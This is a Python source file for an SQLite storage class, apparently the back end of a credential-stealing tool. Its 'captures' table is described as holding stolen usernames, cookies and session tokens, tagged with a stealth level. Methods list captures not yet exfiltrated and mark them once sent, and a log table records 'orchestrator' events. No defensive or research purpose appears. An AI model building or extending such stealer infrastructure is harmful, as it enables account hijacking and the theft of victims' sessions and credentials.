import sqlite3
import os
from datetime import datetime

class VantaDatabase:
    """
    CLASS: VantaDatabase
    ROLE: Manages data persistence via SQLite.
    WHY: Prevent data loss in case of main program crash and ensure ACID integrity.
    """
    def __init__(self, db_path="hitch_vault.db"):
        # db_path: Path to the SQLite database file (Vault)
        self.db_path = db_path
        self.init_db()

    def init_db(self):
        """INITIALIZES the necessary tables if they do not yet exist."""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            # 'captures' table: Stores usernames, cookies, and session tokens
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS captures (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                    source TEXT,
                    data TEXT,
                    stealth_level INTEGER,
                    exfiltrated BOOLEAN DEFAULT 0
                )
            ''')
            # 'system_logs' table: Stores the history of orchestrator events
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS system_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                    level TEXT,
                    message TEXT
                )
            ''')
            conn.commit()

    def save_capture(self, source, data, stealth_level=1):
        """SAVES a capture in the vault with its stealth level."""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('INSERT INTO captures (source, data, stealth_level) VALUES (?, ?, ?)', 
                           (source, data, stealth_level))
            conn.commit()

    def get_unexfiltrated(self):
        """RETRIEVES captures that have not yet been exfiltrated."""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT id, source, data FROM captures WHERE exfiltrated = 0')
            return cursor.fetchall()

    def mark_as_exfiltrated(self, capture_id):
        """MARKS a capture as exfiltrated to avoid duplicate processing."""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('UPDATE captures SET exfiltrated = 1 WHERE id = ?', (capture_id,))
            conn.commit()
